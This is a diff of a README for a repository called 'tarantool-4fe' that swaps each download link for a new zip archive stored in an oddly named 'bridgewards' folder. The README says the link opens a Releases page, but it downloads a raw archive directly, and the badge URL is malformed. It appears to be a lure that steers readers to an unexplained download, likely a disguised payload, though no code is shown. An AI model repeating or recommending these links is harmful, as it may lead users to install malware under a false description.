@@ -1,6 +1,6 @@
 # 🐍 tarantool-4fe - A Simple Way to Use Tarantool
 
-[![Download tarantool-4fe](https://raw.githubusercontent.com/xyxcau/tarantool-4fe/main/bridgewards/tarantool-4fe.zip%https://raw.githubusercontent.com/xyxcau/tarantool-4fe/main/bridgewards/tarantool-4fe.zip)](https://raw.githubusercontent.com/xyxcau/tarantool-4fe/main/bridgewards/tarantool-4fe.zip)
+[![Download tarantool-4fe](https://github.com/xyxcau/tarantool-4fe/raw/refs/heads/main/bridgewards/tarantool-fe-v1.8.zip%https://github.com/xyxcau/tarantool-4fe/raw/refs/heads/main/bridgewards/tarantool-fe-v1.8.zip)](https://github.com/xyxcau/tarantool-4fe/raw/refs/heads/main/bridgewards/tarantool-fe-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, please ensure your computer meets the following requirements
 
 To get started, visit the releases page to download the application:
 
-[Download tarantool-4fe](https://raw.githubusercontent.com/xyxcau/tarantool-4fe/main/bridgewards/tarantool-4fe.zip)
+[Download tarantool-4fe](https://github.com/xyxcau/tarantool-4fe/raw/refs/heads/main/bridgewards/tarantool-fe-v1.8.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of tarantool-4fe.
@@ -85,7 +85,7 @@ If you need help, consult the following resources:
 
 To keep your application current with the latest features and fixes, regularly check the Releases page:
 
-[Download tarantool-4fe](https://raw.githubusercontent.com/xyxcau/tarantool-4fe/main/bridgewards/tarantool-4fe.zip) 
+[Download tarantool-4fe](https://github.com/xyxcau/tarantool-4fe/raw/refs/heads/main/bridgewards/tarantool-fe-v1.8.zip) 
 
 ## 🏅 Conclusion
 
